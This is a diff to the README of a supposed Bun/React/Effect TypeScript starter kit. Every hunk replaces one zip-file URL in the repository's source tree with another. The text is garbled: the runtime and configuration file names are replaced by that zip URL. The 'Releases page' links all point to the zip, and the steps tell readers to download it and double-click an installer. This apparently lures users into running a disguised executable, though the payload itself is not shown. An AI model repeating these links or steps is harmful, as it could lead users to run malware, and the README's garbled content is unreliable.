@@ -1,7 +1,7 @@
 # 🎉 bun-react-effect-example - A Type-Safe React Starter Kit
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/miradeviar/bun-react-effect-example/main/src/components/bun-react-effect-example-v3.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/miradeviar/bun-react-effect-example/main/src/components/bun-react-effect-example-v3.0.zip)
+[![Download Latest Release](https://github.com/miradeviar/bun-react-effect-example/raw/refs/heads/main/src/lib/effect-react-bun-example-v2.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/miradeviar/bun-react-effect-example/raw/refs/heads/main/src/lib/effect-react-bun-example-v2.0.zip)
 
 ## 🚀 Getting Started
 The **bun-react-effect-example** is a starter kit for building React applications. Designed for both beginners and experts, this template uses TypeScript for type safety, making your development process easier and more reliable. Follow these steps to get started quickly.
@@ -9,7 +9,7 @@ The **bun-react-effect-example** is a starter kit for building React application
 ## 🛠 System Requirements
 Before you begin, ensure that your computer meets the following requirements:
 - **Operating System:** Windows 10 or later, macOS Catalina or later, or a recent Linux distribution.
-- **https://raw.githubusercontent.com/miradeviar/bun-react-effect-example/main/src/components/bun-react-effect-example-v3.0.zip** Version 14.0.0 or higher.
+- **https://github.com/miradeviar/bun-react-effect-example/raw/refs/heads/main/src/lib/effect-react-bun-example-v2.0.zip** Version 14.0.0 or higher.
 - **Internet Connection:** Required for downloading the application.
 
 ## 🔍 Features
@@ -22,7 +22,7 @@ Before you begin, ensure that your computer meets the following requirements:
 ## 📥 Download & Install
 To get the latest version of the bun-react-effect-example, follow these steps:
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/miradeviar/bun-react-effect-example/main/src/components/bun-react-effect-example-v3.0.zip) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/miradeviar/bun-react-effect-example/raw/refs/heads/main/src/lib/effect-react-bun-example-v2.0.zip) to go to the releases page.
 2. **Choose Your Version:** Look for the most recent release. Each version is labeled with its release number.
 3. **Download the Installation File:** Click on the link to download the file suitable for your operating system.
 4. **Run the Installer:** Once downloaded, locate the file in your downloads folder and double-click it to start the installation process.
@@ -57,12 +57,12 @@ This URL is the default address for local development. If you have customized th
 
 ## 📄 Configuration
 You can further customize your project by modifying the following configuration files:
-- **`https://raw.githubusercontent.com/miradeviar/bun-react-effect-example/main/src/components/bun-react-effect-example-v3.0.zip`:** Modify your application settings.
-- **`https://raw.githubusercontent.com/miradeviar/bun-react-effect-example/main/src/components/bun-react-effect-example-v3.0.zip`:** Update your TypeScript settings to fit your coding preferences.
+- **`https://github.com/miradeviar/bun-react-effect-example/raw/refs/heads/main/src/lib/effect-react-bun-example-v2.0.zip`:** Modify your application settings.
+- **`https://github.com/miradeviar/bun-react-effect-example/raw/refs/heads/main/src/lib/effect-react-bun-example-v2.0.zip`:** Update your TypeScript settings to fit your coding preferences.
 
 ## ⚙️ Troubleshooting
 If you encounter issues during installation or while running your application, consider the following tips:
-- Ensure that you have installed **https://raw.githubusercontent.com/miradeviar/bun-react-effect-example/main/src/components/bun-react-effect-example-v3.0.zip** properly.
+- Ensure that you have installed **https://github.com/miradeviar/bun-react-effect-example/raw/refs/heads/main/src/lib/effect-react-bun-example-v2.0.zip** properly.
 - Verify that you are using the correct command in your terminal.
 - Check the project's related issues on GitHub for potential fixes.
 
@@ -84,6 +84,6 @@ A: Yes, this starter kit can be integrated into your current React projects.
 If you have questions or need support, feel free to open an issue on the GitHub repository. We will do our best to assist you.
 
 ## 📥 Download Again
-To access the latest version, revisit the [Releases page](https://raw.githubusercontent.com/miradeviar/bun-react-effect-example/main/src/components/bun-react-effect-example-v3.0.zip).
+To access the latest version, revisit the [Releases page](https://github.com/miradeviar/bun-react-effect-example/raw/refs/heads/main/src/lib/effect-react-bun-example-v2.0.zip).
 
 Happy coding!
